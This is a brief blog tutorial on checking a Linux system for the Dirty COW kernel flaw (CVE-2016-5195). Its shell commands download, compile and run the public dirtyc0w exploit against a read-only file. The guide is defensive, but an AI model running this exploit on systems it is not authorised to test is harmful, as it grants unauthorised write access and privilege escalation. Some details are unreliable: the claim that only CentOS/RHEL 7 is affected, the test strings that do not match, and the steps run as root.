#Testing for the dirty cow CVE-2016-5195?
On october 19 2016, the Dirty Cow vulnerability went public (which is kernel privilege escalation vulnerability) . From what I have read and test, the exploit is working only on Centos 7/ RHEL7 / Cloudlinux 7 distros .

CVE-2016-5195

Why is it called the Dirty COW bug?

“A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.”

Source info: http://dirtycow.ninja/



#How to test if you are vulnerable ?

1) Download and compile the PoC then run the following commands

```sh
curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > dirtyc0w.c
sudo -s
echo This is a TEST > foo
chmod 0404 foo
ls -lah foo
-r—–r– 1 root root 19 Oct 20 15:23 foo
cat foo
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w foo m00000000000000000
```


Finally check if the file foo is modified:
If you get this:
```sh
root@server# cat /home/some_user/foo
m00000000000000000
```

Then you are VULNERABLE.

If you get this
```sh
root@server# cat /home/some_user/foo
This is a test file
```

You are SAFE

 

keep updating your linux kernels

#Reference
https://www.redpacketsecurity.com/testing-dirty-cow-cve-2016-5195/

#LINK:
https://dirtycow.ninja

https://github.com/dirtycow/dirtycow.github.io

https://github.com/dirtycow/dirtycow.github.io/wiki

https://github.com/linhlt247/dirtycow.github.io
